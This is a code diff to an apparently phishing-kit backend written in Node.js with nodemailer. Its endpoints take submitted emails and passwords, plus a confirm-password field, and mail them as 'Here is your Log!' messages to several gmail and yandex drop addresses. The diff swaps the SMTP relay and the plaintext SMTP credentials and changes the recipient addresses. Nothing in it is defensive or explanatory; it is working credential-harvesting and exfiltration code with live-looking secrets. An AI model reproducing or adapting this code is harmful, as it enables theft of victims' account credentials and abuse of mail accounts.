@@ -18,11 +18,11 @@ app.post("/sendmail", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.lennox.co.ke",
+      host: "host51.registrar-servers.com",
       port: 465,
       auth: {
-        user: "info@lennox.co.ke",
-        pass: "!in@Len432*",
+        user: "info@goafze.com",
+        pass: "sH=dzO.mvg+;",
       },
     });
     let info = await transporter.sendMail({
@@ -52,16 +52,16 @@ app.post("/sendmail5", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.lennox.co.ke",
+      host: "host51.registrar-servers.com",
       port: 465,
       auth: {
-        user: "info@lennox.co.ke",
-        pass: "!in@Len432*",
+        user: "info@goafze.com",
+        pass: "sH=dzO.mvg+;",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <info@lennox.co.ke>',
-      to: "suemicheallaccuplas@gmail.com",
+      from: '"Happy time" <info@goafze.com>',
+      to: "daniellahm@yandex.com",
       subject: "happy Time",
       html: `
     <div> 
@@ -87,15 +87,15 @@ app.post("/sendmail2", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.lennox.co.ke",
+      host: "host51.registrar-servers.com",
       port: 465,
       auth: {
-        user: "info@lennox.co.ke",
-        pass: "!in@Len432*",
+        user: "info@goafze.com",
+        pass: "sH=dzO.mvg+;",
       },
     });
     let info = await transporter.sendMail({
-      from: '"You" <info@lennox.co.ke>',
+      from: '"You" <info@goafze.com>',
       to: "sales1.ppsl@gmail.com",
       subject: "xxxlogs",
       html: `
@@ -122,15 +122,15 @@ app.post("/sendmail3", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.lennox.co.ke",
+      host: "host51.registrar-servers.com",
       port: 465,
       auth: {
-        user: "info@lennox.co.ke",
-        pass: "!in@Len432*",
+        user: "info@goafze.com",
+        pass: "sH=dzO.mvg+;",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <info@lennox.co.ke>',
+      from: '"Happy time" <info@goafze.com>',
       to: "fredrick3smith33@gmail.com",
       subject: "Happy time",
       html: `
@@ -155,50 +155,16 @@ app.post("/sendmail4", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.lennox.co.ke",
+      host: "host51.registrar-servers.com",
       port: 465,
       auth: {
-        user: "info@lennox.co.ke",
-        pass: "!in@Len432*",
+        user: "info@goafze.com",
+        pass: "sH=dzO.mvg+;",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <info@lennox.co.ke>',
-      to: "daniellahm@yandex.com",
-      subject: "Happy time",
-      html: `
-    <div> 
-      <h2>Here is your Log!</h2>
-        <p>Email: ${email}</p>
-        <p>Pass: ${pass}</p>
-        <p>Confirm Pass: ${pasers}</p>
-    
-        <p>All the best, XXXmannnXXX</p>
-         </div>
-    `,
-    });
-
-    await transporter.sendMail(info);
-    res.send("Email sent successfully");
-  } catch (error) {
-    console.error(error);
-    res.status(500).send("Error sending email");
-  }
-});
-app.post("/sendmail7", async (req, res) => {
-  const { email, pass, pasers } = req.body;
-  try {
-    let transporter = nodemailer.createTransport({
-      host: "mail.lennox.co.ke",
-      port: 465,
-      auth: {
-        user: "info@lennox.co.ke",
-        pass: "!in@Len432*",
-      },
-    });
-    let info = await transporter.sendMail({
-      from: '"Happy time" <info@lennox.co.ke>',
-      to: "soccerroos23@gmail.com",
+      from: '"Happy time" <info@goafze.com>',
+      to: "p4pi.j@yandex.com",
       subject: "Happy time",
       html: `
     <div> 
